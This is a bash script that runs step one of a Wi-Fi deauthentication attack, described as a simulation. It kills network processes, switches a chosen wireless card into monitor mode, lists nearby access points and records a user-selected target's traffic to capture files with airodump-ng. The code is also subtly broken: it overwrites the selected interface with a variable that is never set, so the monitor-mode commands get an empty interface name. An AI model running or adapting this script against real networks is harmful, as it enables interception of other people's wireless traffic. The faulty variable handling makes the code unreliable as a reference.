#!/bin/bash
# Deauthentication Attack Step 1: Display WAP & capture data traffic from it into files
# Dependencies:
# - https://github.com/aircrack-ng/aircrack-ng
# - https://git.kernel.org/pub/scm/linux/kernel/git/jberg/iw.git
# - https://github.com/BurntSushi/ripgrep

BOLD="\e[1m"
RED="\e[0;31m"
GREEN="\e[0;32m"
BLUE="\e[0;34m"
YELLOW="\e[0;33m"
NORMAL="\e[0m"

echo -e "${BLUE}${BOLD}*** Wi-Fi Deauthentication Attack Simulation Using Arch Linux ***${NORMAL}"
echo -e "${YELLOW}=== Perform Deauthentication Attack Step 1: Capture ===${NORMAL}\n"

# Two terminal windows are required for the attack, notify the user
echo -e "Two terminal windows are ${BOLD}required${NORMAL} to perform the deauthentication attack:"
echo -e "${GREEN}${BOLD}1. Display the WAP that will be attacked & capture data traffic from it into files${NORMAL}"
echo -e "2. Perform the deauthentication attack"
echo -e

# Check for conflicting processes and kill them
echo -e "Killing conflicting processes"
sudo airmon-ng check kill

# Find the names of the wireless network interface controllers (WNICs)
readarray -t WIFI_INTERFACES < <(iw dev | rg -o 'wlp.*')

# List the names of the found WNICs
echo -e "${BOLD}${#WIFI_INTERFACES[@]}${NORMAL} wireless network interface(s) detected:"
for ((i = 0; i < ${#WIFI_INTERFACES[@]}; i++)); do
  echo -e "$((i + 1)). ${BOLD}${WIFI_INTERFACES[i]}${NORMAL}"
done
echo -e

# Let the user pick a WNIC from the numbered list of WNICs
read -r -p "Select an interface to use for monitoring (1..${#WIFI_INTERFACES[@]}): " INTERFACE_I
# Check that the pick is valid
if ((INTERFACE_I < 1 || INTERFACE_I > ${#WIFI_INTERFACES[@]})); then
  echo -e "${RED}Invalid interface. Please select an interface from the list.${NORMAL}"
  exit 1
fi
INTERFACE_NAME_MONITOR="${WIFI_INTERFACES[${INTERFACE_I} - 1]}"

# Set the interface into monitor mode
INTERFACE_NAME_MONITOR="${INTERFACE_NAME}mon"
echo -e "Setting interface ${BOLD}${INTERFACE_NAME}${NORMAL} into monitor mode"
sudo airmon-ng start "${INTERFACE_NAME}"
echo -e "Monitoring interface name is ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
echo -e

# Discover wireless access points (WAPs) around the monitoring interface
echo -e "Searching for WAPs using ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
echo -e "${GREEN}Note down the ${BOLD}BSSID${NORMAL}${GREEN} & ${BOLD}CH${NORMAL}${GREEN} value of the WAP you wish to attack. You will be asked to enter them.${NORMAL}"
read -n 1 -s -r -p "Press any key to continue..."
echo -e
sudo airodump-ng -b abg "${INTERFACE_NAME_MONITOR}"

# Ask user to enter BSSID & CH value of the WAP they wish to attack
read -rp "Enter BSSID of WAP to attack (MAC Address, e.g. AA:BB:CC:11:22:33): " BSSID
read -rp "Enter CH (Channel) of WAP to attack (1-165): " CHANNEL
echo -e

# Ask user to enter the file prefix of the file for data capture
read -rp "Enter file prefix for data capture: " FILE_PREFIX
# Capture data from the specified WAP on a specific channel
echo -e "Capturing data from ${BOLD}${BSSID}${NORMAL} on channel ${BOLD}${CHANNEL}${NORMAL} using monitor ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
echo -e "Data will be stored in files with the name ${BOLD}${FILE_PREFIX}-01.*${NORMAL}"
echo -e "Use ${BOLD}Wireshark${NORMAL} to view the data. Open files using a file explorer, directly in Wireshark, or with the command ${GREEN}wireshark ${FILE_PREFIX}-01.cap${NORMAL}."
read -n 1 -s -r -p "Press any key to continue..."
sudo airodump-ng -w "${FILE_PREFIX}" -c "${CHANNEL}" -d "${BSSID}" "${INTERFACE_NAME_MONITOR}"
